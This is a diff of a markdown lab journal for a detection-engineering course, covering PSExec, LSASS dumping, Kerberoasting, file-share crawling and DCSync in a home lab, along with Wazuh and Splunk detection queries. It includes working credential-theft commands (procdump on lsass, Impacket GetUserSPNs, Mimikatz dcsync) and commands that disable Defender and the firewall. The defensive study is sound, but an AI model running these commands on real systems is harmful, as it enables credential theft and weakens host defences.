@@ -48,45 +48,24 @@ Use Metasploit's PSExec module to remotely execute a payload on a victim Windows
 
 ### Steps Taken
 
-1. Confirmed victim host (Win11V) IP address via bridged USB-C Ethernet adapter on Parallels
-2. Confirmed attacker host (LinuxA) IP address on Proxmox
-3. Disabled Windows Defender on Win11V via registry key:
-   ```
-   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-   ```
-4. Disabled Windows Firewall on Win11V:
-   ```powershell
-   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
-   ```
-5. Configured and launched Metasploit PSExec module with x86 payload (x64 payloads fail on ARM64 Windows)
-6. Captured traffic on LinuxA using tcpdump, uploaded PCAP to Malcolm
-7. Analyzed sessions in Arkime
+1. Confirmed victim and attacker host IPs
+2. Disabled Windows Defender on victim host via registry key
+3. Disabled Windows Firewall on victim host
+4. Configured and launched Metasploit PSExec module with x86 payload (x64 payloads fail on ARM64 Windows)
+5. Captured traffic on attacker host using tcpdump, uploaded PCAP to Malcolm
+6. Analyzed sessions in Arkime
 
 ### Telemetry / Detections
 
 **Malcolm / Arkime — NTLM Authentication**
 
-Query: `ip == <attacker IP> && ip == <victim IP> && protocols == ntlm`
-
-Administrator authenticated from LinuxA to Win11V on port 445. Action: Authenticate → Result: Success. Extracted entirely from packet capture with no host-based logging required.
+Administrator authenticated from attacker to victim on port 445. Extracted entirely from packet capture with no host-based logging required.
 
 **Malcolm / Arkime — TLS Session Analysis**
 
 - JA3: `0696c16261fe58808f9fa965be137acd`
 - JA3s: `ec74a5c51106f0419184d0dd08fb05bc`
 - Certificate Thumbprint: `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45` (self-signed, Metasploit-generated)
-
-**Splunk — Command Line Length Detection**
-
-```splunk
-index=sysmon
-| where EventCode = 1
-| eval CommandLineLength = len(CommandLine)
-| eval ParentCommandLineLength = len(ParentCommandLine)
-| where (ParentCommandLineLength > 2500 OR CommandLineLength > 2500)
-| where ParentImage != "C:\\Windows\\explorer.exe"
-| table CommandLine,ProcessGuid
-```
 
 ### Notes & Gotchas
 
@@ -96,7 +75,109 @@ index=sysmon
 
 ---
 
-## Lab 2 — Credential Access: File Shares
+## Lab 2 — Credential Access: LSASS
+**Module:** 08 - Credential Access on Windows Hosts - LSASS  
+**Date:** 2026-06-17  
+**Status:** [ ] Partial — infrastructure issues prevented full completion  
+**MITRE:** T1003.001
+
+### Objective
+Dump LSASS memory using three methods (Mimikatz/Kiwi via Meterpreter, Task Manager, Procdump), then detect via Sysmon Event ID 10 (process access to LSASS) and Event ID 11 (file creation of dump file).
+
+### Steps Taken
+
+1. Attempted to establish Meterpreter session on victim host via `exploit/windows/smb/psexec` — multiple blockers:
+   - Port 443 unavailable — switched to 8443
+   - Windows Defender repeatedly re-enabled after reboots despite registry policy — Tamper Protection reasserted control
+   - msfvenom exe blocked by Defender IOAV on download even with real-time protection disabled
+2. Pivoted to Procdump (no Meterpreter required):
+   ```cmd
+   certutil -urlcache -f https://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
+   C:\Users\Public\procdump.exe -ma lsass.exe C:\Users\Public\lsass.dmp
+   ```
+   Procdump succeeded and generated an LSASS dump
+3. Sysmon on victim host was found stopped — binary missing, service registry pointed to wrong path
+4. Multiple uninstall/reinstall attempts failed — driver stuck in registered state; reverted to snapshot
+5. Wazuh agent reinstalled but not confirmed active at session end
+
+### Telemetry / Detections
+
+Detection queries not validated — Sysmon not functional during session.
+
+**Target queries for future session:**
+
+```splunk
+index=sysmon EventCode=10 TargetImage="*lsass*"
+| table _time, SourceImage, TargetImage, GrantedAccess, CallTrace
+```
+
+```splunk
+index=sysmon EventCode=11
+| where match(TargetFilename, "(?i)lsass")
+| table _time, Image, TargetFilename
+```
+
+### Notes & Gotchas
+
+- **Defender + Tamper Protection is the primary blocker** — must disable Tamper Protection manually in Windows Security UI before registry-based disablement will stick
+- **Sysmon binary path must match service registry** — ARM64 Parallels hosts require `Sysmon64a.exe`; wrong path causes service failure
+- **SysmonDrv stuck in registered state** — full snapshot revert more reliable than manual driver removal
+- **Procdump works without a shell** — useful fallback when Meterpreter delivery is blocked
+
+---
+
+## Lab 3 — Credential Access: Kerberoasting
+**Module:** 10 - Credential Access on Windows Hosts - Kerberoasting  
+**Date:** 2026-06-19  
+**Status:** [x] Complete  
+**MITRE:** T1558.003
+
+### Objective
+Execute a Kerberoasting attack using Impacket's GetUserSPNs.py to request TGS tickets for service accounts, then detect via Windows Event ID 4769 (Kerberos Service Ticket Request) filtering for RC4 encryption type.
+
+### Steps Taken
+
+1. Created Kerberoast OU and 8 service accounts on DC with HTTP SPNs
+2. Set `msDS-SupportedEncryptionTypes = 28` on all accounts (required to allow RC4 ticket requests — blank value resolves to AES-only on Server 2019)
+3. Restored DC audit policy (had been wiped to "No Auditing" across all subcategories)
+4. Installed Impacket on attacker host via pipx
+5. Executed Kerberoasting:
+   ```bash
+   GetUserSPNs.py <REDACTED>/Administrator:<REDACTED> -dc-ip <DC IP> -outputfile /tmp/kerbtickets.txt -request
+   ```
+   Successfully requested TGS tickets for all 8 service accounts
+6. Validated Event ID 4769 in Wazuh and Splunk
+7. Uploaded PCAP to Malcolm for Zeek Kerberos session analysis
+
+### Telemetry / Detections
+
+**Wazuh — Kerberoasting Detection (Event ID 4769)**
+
+```
+data.win.system.eventID: 4769 AND data.win.eventdata.sessionKeyEncryptionType: 0x17
+```
+`0x17` = RC4-HMAC — the downgrade indicator. All 8 service account TGS requests confirmed.
+
+**Splunk — Kerberoasting Detection**
+
+```splunk
+index=winlogs EventCode=4769
+| where TicketEncryptionType="0x17"
+| stats count by Account_Name, Service_Name, Client_Address
+```
+
+**Malcolm / Zeek** — Kerberos sessions confirmed between attacker and DC on port 88.
+
+### Notes & Gotchas
+
+- **`msDS-SupportedEncryptionTypes` must be set to 28** — blank value causes `KDC_ERR_ETYPE_NOSUPP`; Impacket produces no tickets
+- **DC audit policy was wiped** — check `auditpol /get /category:*` before any detection lab if events aren't appearing
+- **Wazuh archives vs alerts:** Always query `wazuh-archives-*` for custom detections — `wazuh-alerts-*` only contains rule-matched events
+- **`data.win.system.eventID` field:** Use without `.keyword` suffix in Wazuh DQL
+
+---
+
+## Lab 4 — Credential Access: File Shares
 **Module:** 09 - Credential Access on Windows Hosts - File Shares  
 **Date:** 2026-06-21  
 **Status:** [x] Complete  
@@ -112,66 +193,44 @@ Detect credential access through SMB file shares using Windows Event ID 5145 (De
    auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
    ```
 2. Created `lowpriv` AD user denied access to test shares
-3. Created 15 test SMB shares on DC:
-   ```powershell
-   $numbers = 1..15
-   foreach($number in $numbers) {
-       New-Item "C:\Shares\Share$number" -itemType Directory
-       New-SmbShare -Name "Logs$number" -Path "C:\Shares\Share$number" -NoAccess lowpriv -FullAccess 'Everyone'
-   }
-   ```
-4. Created `passwords.txt` in Logs1 share as a sensitive file target
-5. Validated Event ID 5145 telemetry from Win11A:
-   - Successful share browse → 5145 with `Relative Target Name: \`, access granted
-   - Denied access as `lowpriv` → 5145 with explicit deny ACE
-   - File-level access → 5145 with `Relative Target Name: passwords.txt`
-6. Downloaded Snaffler v1.0.126 to Win11A (Defender + Tamper Protection disabled first)
-7. Ran Snaffler as Administrator — found `passwords.txt` plus real sensitive files including `unattend.xml` with credential material left from OS installation
-8. Ran Snaffler as `lowpriv` — generated bulk failure telemetry against all 15 denied shares
-9. Built and validated detection queries in Wazuh (Splunk license hard-blocked)
+3. Created 15 test SMB shares on DC
+4. Created `passwords.txt` in a share as a sensitive file target
+5. Validated three distinct 5145 telemetry patterns: granted access, denied access, and file-level access
+6. Ran Snaffler v1.0.126 as Administrator — found passwords.txt plus real findings including `unattend.xml` with credential material from OS installation
+7. Ran Snaffler as `lowpriv` — generated bulk failure telemetry against all 15 denied shares
+8. Validated all detections in Wazuh (Splunk hard-blocked)
 
 ### Telemetry / Detections
 
-**Wazuh — Sensitive File Access Detection**
-
+**Wazuh — Sensitive File Access**
 ```
 data.win.system.eventID: 5145 AND data.win.eventdata.relativeTargetName: *password*
 ```
-Result: 19 hits — caught `passwords.txt` plus Splunk `remote-password-management` files from Snaffler's C$ crawl.
+19 hits — caught passwords.txt plus Splunk remote-password-management files from Snaffler C$ crawl.
 
 **Wazuh — Share Enumeration by Account**
-
 ```
 data.win.system.eventID: 5145 AND data.win.eventdata.subjectUserName: lowpriv
 ```
-Result: 116 hits — spike in histogram corresponds to Snaffler run timing.
-
-**Key field mappings in Wazuh for Event ID 5145:**
-- `data.win.eventdata.shareName` — share path
-- `data.win.eventdata.relativeTargetName` — filename within share (`\` = share root browse)
-- `data.win.eventdata.subjectUserName` — account performing access
-- `data.win.eventdata.ipAddress` — source IP
-- `data.win.system.severityValue` — `AUDIT_SUCCESS` or `AUDIT_FAILURE`
+116 hits — histogram spike matches Snaffler run timing exactly.
 
 ### Notes & Gotchas
 
-- **Event ID 5145 requires manual auditpol enablement** — `Detailed File Share` subcategory is off by default
-- **auditpol vs GPO:** Local auditpol settings can be overwritten on next gpupdate if a GPO defines audit policy — proper fix is to configure via Advanced Audit Policy Configuration in GPO
-- **Snaffler v1.0.126 required** — latest version was broken at time of course writing
-- **Defender + Tamper Protection:** Must disable Tamper Protection in Windows Security UI before registry-based Defender disable will stick
-- **Real finding:** Snaffler found `unattend.xml` at `ADMIN$\Panther\` containing redacted credential material from Windows installation — demonstrates real-world impact of share enumeration
-- **SYSVOL/ADMIN$ noise:** These shares generate thousands of 5145 events and must be filtered for file share crawling detections
+- **Event ID 5145 requires manual auditpol enablement** — off by default
+- **Snaffler v1.0.126 required** — latest version broken at time of course writing
+- **Real finding:** `unattend.xml` at `ADMIN$\Panther\` contained credential material from OS install — genuine discovery
+- **Splunk hard-blocked** — license cap hit too many times; all queries run in Wazuh
 
 ---
 
-## Lab 3 — Credential Access: DCSync
+## Lab 5 — Credential Access: DCSync
 **Module:** 11 - Credential Access on Windows Hosts - DCSync  
 **Date:** 2026-06-21  
 **Status:** [x] Complete  
 **MITRE:** T1003.006
 
 ### Objective
-Execute a DCSync attack using Mimikatz to replicate Active Directory credentials from the domain controller, then detect it using Windows Event ID 4662 (directory service object access) correlated with Event ID 4624 (logon) to identify the source as a workstation rather than a legitimate DC.
+Execute a DCSync attack using Mimikatz to replicate Active Directory credentials from the domain controller, then detect via Event ID 4662 correlated with Event ID 4624 to identify the source as a workstation.
 
 ### Steps Taken
 
@@ -179,42 +238,31 @@ Execute a DCSync attack using Mimikatz to replicate Active Directory credentials
    ```powershell
    auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable
    ```
-2. Downloaded and extracted Mimikatz to Win11A
-3. Executed DCSync from Mimikatz on Win11A:
+2. Downloaded and extracted Mimikatz to attacker workstation
+3. Executed DCSync:
    ```
    lsadump::dcsync /domain:<REDACTED> /user:Administrator
    ```
-4. Mimikatz successfully replicated Administrator credentials including NTLM hash and Kerberos keys
-5. Queried Wazuh for Event ID 4662 with DCSync replication GUID
-6. Correlated 4662 logon ID with 4624 to identify source IP as Win11A (a workstation)
+4. Queried Wazuh for 4662 with DCSync GUID, correlated with 4624 via logon ID
 
 ### Telemetry / Detections
 
 **Wazuh — DCSync Detection (Event ID 4662)**
-
 ```
 data.win.system.eventID: 4662 AND data.win.eventdata.properties: *1131f6ad*
 ```
-Result: 1 hit — GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) confirmed in properties field.
+1 hit — GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All) confirmed.
 
 **Wazuh — Logon Correlation (Event ID 4624)**
-
 ```
 data.win.system.eventID: 4624 AND data.win.eventdata.targetLogonId: <logon ID from 4662>
 ```
-Result: 1 hit — source IP confirmed as Win11A (a workstation). Authentication via Kerberos, Logon Type 3. Only domain controllers should perform AD replication — replication from a workstation IP is definitive DCSync evidence.
-
-**Key detection logic:**
-- Event 4662 fires when directory replication rights are exercised
-- GUID `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` = DS-Replication-Get-Changes-All
-- Joining with 4624 via LogonId exposes the source IP
-- Source IP not belonging to a DC = confirmed attack
+1 hit — source IP confirmed as attacker workstation (not a DC). Kerberos, Logon Type 3. Workstation performing AD replication = confirmed DCSync.
 
 ### Notes & Gotchas
 
-- **Event ID 4662 requires manual auditpol enablement** — `Directory Service Access` subcategory is off by default
-- **Splunk license hard-blocked** — all queries run in Wazuh; field names differ from course SPL examples
-- **Malcolm network detection skipped** — `zeek.notice.msg == drsuapi::DRSGetNCChanges` would detect this at the network layer but Malcolm has no live capture configured without a SPAN port
+- **Event ID 4662 requires manual auditpol enablement** — `Directory Service Access` off by default
+- **Malcolm network detection skipped** — `zeek.notice.msg == drsuapi::DRSGetNCChanges` would detect at network layer but requires live PCAP capture
 
 ---
 
@@ -232,9 +280,7 @@ Result: 1 hit — source IP confirmed as Win11A (a workstation). Authentication 
 1. 
 
 ### Telemetry / Detections
-```splunk
 
-```
 
 ### Notes & Gotchas
 
